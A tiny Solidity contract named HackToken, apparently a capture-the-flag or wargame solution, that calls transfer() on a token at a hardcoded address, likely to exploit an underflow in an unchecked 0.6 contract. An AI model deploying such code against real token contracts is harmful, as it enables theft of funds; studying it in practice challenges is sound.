// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract HackToken {
    Token public token = Token(0x6F26e8dbC0Cd1060Ec5A8c3df354324a3619BFAc);

    function hackTransfer(address _to, uint256 _value) public {
        token.transfer(_to, _value);
    }
}
